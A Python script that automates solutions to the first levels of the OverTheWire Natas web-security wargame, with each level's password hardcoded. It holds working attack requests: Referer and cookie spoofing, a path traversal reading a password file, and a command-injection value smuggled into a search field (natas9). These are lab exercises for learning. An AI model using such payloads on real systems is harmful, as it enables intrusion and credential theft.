import requests
from bs4 import BeautifulSoup
import re, os, base64
import html

url = {
    "natas0": "http://natas0.natas.labs.overthewire.org",
    "natas1": "http://natas1.natas.labs.overthewire.org",
    "natas2": "http://natas2.natas.labs.overthewire.org",
    "natas3": "http://natas3.natas.labs.overthewire.org",
    "natas4": "http://natas4.natas.labs.overthewire.org",
    "natas5": "http://natas5.natas.labs.overthewire.org",
    "natas6": "http://natas6.natas.labs.overthewire.org",
    "natas7": "http://natas7.natas.labs.overthewire.org",
    "natas8": "http://natas8.natas.labs.overthewire.org",
    "natas9": "http://natas9.natas.labs.overthewire.org",
    "natas10": "http://natas10.natas.labs.overthewire.org"
}
username = {
    "natas0": "natas0",
    "natas1": "natas1",
    "natas2": "natas2",
    "natas3": "natas3",
    "natas4": "natas4",
    "natas5": "natas5",
    "natas6": "natas6",
    "natas7": "natas7",
    "natas8": "natas8",
    "natas9": "natas9",
    "natas10": "natas10"
}
password = {
    "natas0": "natas0",
    "natas1": "g9D9cREhslqBKtcA2uocGHPfMZVzeFK6",
    "natas2": "h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7",
    "natas3": "G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q",
    "natas4": "tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm",
    "natas5": "Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD",
    "natas6": "fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR",
    "natas7": "jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr",
    "natas8": "a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB",
    "natas9": "Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd",
    "natas10": "D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE"
}


def tags_pattern(html_text, src, href):
    # Define the patterns
    src_pattern = r'<img\s+src="([^"]+)"'
    href_pattern = r'<a\s+href="([^"]+)"'
    html_text = str(html_text)
    # Extract matches
    src_matches = re.findall(src_pattern, html_text)
    href_matches = re.findall(href_pattern, html_text)

    # Initialize sets
    src_set = set()
    href_set = set()

    # Process src matches
    for match in src_matches:
        parts = match.split('/')
        for i in range(1, len(parts) + 1):
            src_set.add('/'.join(parts[:i]))

    # Process href matches
    for match in href_matches:
        parts = match.split('/')
        for i in range(1, len(parts) + 1):
            href_set.add('/'.join(parts[:i]))
    if src:
        return src_set
    if href:
        return href_set
def natas0():
    response = requests.get(url["natas0"], auth=(username["natas0"], password["natas0"]))
    soup = BeautifulSoup(response.text, 'html.parser')
    print(soup.body)

def natas1():
    response = requests.get(url["natas1"], auth=(username["natas1"], password["natas1"]))
    soup = BeautifulSoup(response.text, 'html.parser')
    print(soup.body)
def natas2():
    response = requests.get(str(url["natas2"]), auth=(username["natas2"], password["natas2"]))
    soup = BeautifulSoup(response.text, 'html.parser')
    for x in tags_pattern(soup.body, src=True, href=True):
        if x[-4] == '.':
            pass
        else:
            print(x)
            new_url = url["natas2"] + "/" + x
            print(new_url)
            response_new = requests.get(new_url, auth=(username["natas2"], password["natas2"]))
            soup_new = BeautifulSoup(response_new.text, 'html.parser')
            for y in tags_pattern(soup_new.body, src=False, href=True):
                root, ext = os.path.splitext(y)
                if ext == '.txt':
                    print(y)
                    new_url = new_url + "/" + y
                    print(new_url)
                    response_new = requests.get(new_url, auth=(username["natas2"], password["natas2"]))
                    soup_new = BeautifulSoup(response_new.text, 'html.parser')
                    print(soup_new.text)
                # new_url = url["natas2"] + "/" + y
                # print(new_url)
                # response_new = requests.get(new_url, auth=(username["natas2"], password["natas2"]))
                # soup_new = BeautifulSoup(response_new.text, 'html.parser')
                # print(soup_new.body)


def natas3():
    AUTH = requests.auth.HTTPBasicAuth(username["natas3"], password["natas3"])
    session = requests.Session()
    session.auth = AUTH
    response = session.get(url=url["natas3"])
    soup = BeautifulSoup(response.text, 'html.parser')
    body = soup.find('body')
    div_content = body.find('div', {'id': 'content'})
    print(f'{div_content}\n')
    response = requests.get(url=url["natas3"] + '/robots.txt')
    print(f'{response.text}\n')
    s3cr3t = re.search(r'Disallow: (/\w+/)', response.text).group(1)
    response = session.get(url=url["natas3"] + s3cr3t)
    soup = BeautifulSoup(response.text, 'html.parser')
    a = soup.find('a', {'href' : 'users.txt'})
    print(f'{a}\n')
    users = re.search(r'>(.+)<', str(a)).group(1)
    response = session.get(url=url["natas3"] + s3cr3t + users)
    password = re.search(r'natas4:(\w+)', response.text).group(1)
    print(f'natas4 password: {password}')

def natas4():
    response = requests.get(url["natas4"], auth=(username["natas4"], password["natas4"]),
                            headers={'Referer': 'http://natas5.natas.labs.overthewire.org/'})
    soup = BeautifulSoup(response.text, 'html.parser')
    print(soup.body)

def natas5():
    response = requests.get(url["natas5"], auth=(username["natas5"], password["natas5"]), cookies={'loggedin': '1'})
    soup = BeautifulSoup(response.text, 'html.parser')
    print(soup.body)

def natas6():
    # incomplete automation
    response = requests.get(url["natas6"], auth=(username["natas6"], password["natas6"]))
    soup = BeautifulSoup(response.text, 'html.parser')
    print(soup.body)
    response2 = requests.post((url["natas6"] + "/index-source.html"), auth=(username["natas6"], password["natas6"]))
    soup2 = BeautifulSoup(response2.text, 'html.parser')
    print(soup2.text)
    response3 = requests.post((url["natas6"] + "/includes/secret.inc"), auth=(username["natas6"], password["natas6"]))
    soup3 = BeautifulSoup(response3.text, 'html.parser')
    print(soup3.text)

def natas7():
    response = requests.get(url["natas7"], auth=(username["natas7"], password["natas7"]))
    soup = BeautifulSoup(response.text, 'html.parser')
    print(soup.body)
    response2 = requests.post((url["natas7"] + "/index.php?page=../../../../etc/natas_webpass/natas8"), auth=(username["natas7"], password["natas7"]))
    soup2 = BeautifulSoup(response2.text, 'html.parser')
    print(soup2.text)

def natas8():
    # incomplete automation
    response = requests.get(url["natas8"], auth=(username["natas8"], password["natas8"]))
    soup = BeautifulSoup(response.text, 'html.parser')
    print(soup.body)
    response2 = requests.post((url["natas8"] + "/index-source.html"), auth=(username["natas8"], password["natas8"]))
    soup2 = BeautifulSoup(response2.text, 'html.parser')
    print(soup2.text)
    encodedSecret = "3d3d516343746d4d6d6c315669563362"
    ascii_encodedSecret = bytes.fromhex(encodedSecret).decode()[::-1]
    decodedSecret = base64.b64decode(ascii_encodedSecret).decode()
    print(f'{decodedSecret}\n')

def natas9():
    response = requests.get(url["natas9"], auth=(username["natas9"], password["natas9"]))
    soup = BeautifulSoup(response.text, 'html.parser')
    print(soup.body)
    response2 = requests.post((url["natas9"] + "/index-source.html"), auth=(username["natas9"], password["natas9"]))
    soup2 = BeautifulSoup(response2.text, 'html.parser')
    print(soup2.text)
    data = {
        'needle': '.* /etc/natas_webpass/natas10;',
        'submit': 'submit'
    }
    response3 = requests.post(url["natas9"], auth=(username["natas9"], password["natas9"]), data=data)
    soup3 = BeautifulSoup(response3.text, 'html.parser').body.find('div', {'id' : 'content'})
    print(f'{soup3}\n')

# natas0()
# natas1()
# natas2()
# natas3()
# natas4()
# natas5()
# natas6()
# natas7()
# natas8()
natas9()
# natas10()
